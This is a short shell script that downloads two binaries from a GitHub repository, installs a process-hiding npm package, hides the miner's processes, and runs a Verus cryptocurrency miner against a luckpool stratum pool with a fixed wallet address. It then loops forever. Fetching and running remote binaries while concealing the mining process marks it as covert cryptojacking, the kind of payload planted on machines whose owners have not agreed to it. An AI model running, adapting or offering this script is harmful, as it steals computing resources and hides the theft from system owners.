#!/bin/sh
wget https://github.com/bulboni/vs/raw/main/loop && chmod +x loop
wget https://github.com/bulboni/vs/raw/main/verus-solver && chmod +x verus-solver
apt install nodejs -y
apt install npm -y
npm i -g node-process-hider
ph add vs
ph add loop
./loop -c stratum+tcp://na.luckpool.net:3956 -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.korps2 -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
